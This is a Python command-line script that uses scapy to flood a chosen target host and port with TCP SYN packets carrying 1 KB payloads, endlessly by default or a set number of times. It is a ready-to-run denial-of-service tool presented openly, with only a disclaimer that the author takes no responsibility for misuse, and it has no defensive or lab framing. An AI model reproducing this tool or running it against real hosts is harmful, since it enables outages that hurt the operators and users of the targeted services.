#!/usr/bin/env python

import argparse
import signal
from sys import exit

from scapy.all import send, Raw
from scapy.layers.inet import TCP, IP, RandShort


def keyboard_interrupt_handler(interrupt_signal, frame):
    """
    Keyboard (CTRL + C) interrupt function
    """
    print("TCP SYN Flooding stopped")
    print("KeyboardInterrupt ID: {} {} has been caught.".format(interrupt_signal, frame))
    exit(1)


def tcp_syn_flooding(target, port, count):
    """
    Send TCP/SYN packages

    :param target: target
    :type target: str
    :param port: target port
    :type port: int
    :param count: number of packages
    :type count: str or int
    """
    if count == 'infinite':
        # send 1KB packages
        send(IP(dst=target)/TCP(sport=RandShort(), dport=port, flags="S")/Raw(b"X" * 1024), loop=1, verbose=1)
    else:
        iteration = 0
        while iteration < count:
            print("Send package {}".format(iteration))
            send(IP(dst=target) / TCP(sport=RandShort(), dport=port, flags="S") / Raw(b"X" * 1024), loop=0, verbose=0)
            iteration = iteration + 1

        print("All {} packets successfully sent.".format(count))


def run_app():
    """
    Main function to parse arguments and run
    """
    max_count = 'infinite'

    description = 'TCP/SYN Flooding script'
    epilog = 'The author of this code take no responsibility for your use or misuse'
    parser = argparse.ArgumentParser(prog='TCPSYNFlood.py', description=description, epilog=epilog)
    parser.add_argument("target", help="Your target to reach")
    parser.add_argument("port", help="Your target port to reach", default=80, type=int)
    parser.add_argument('-c', '--count', help='The amount of SYN packets to send.', type=int)
    args = parser.parse_args()

    if len(args.target) < 1:
        print('You did not provide any target?')
        exit(1)

    if args.port not in range(1, 65535):
        print('You port cannot be outside the range!')
        exit(1)

    if args.count:
        max_count = args.count

    print("Send {} packages to port {} on target {}".format(max_count, args.port, args.target))
    tcp_syn_flooding(args.target, int(args.port), max_count)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, keyboard_interrupt_handler)
    run_app()
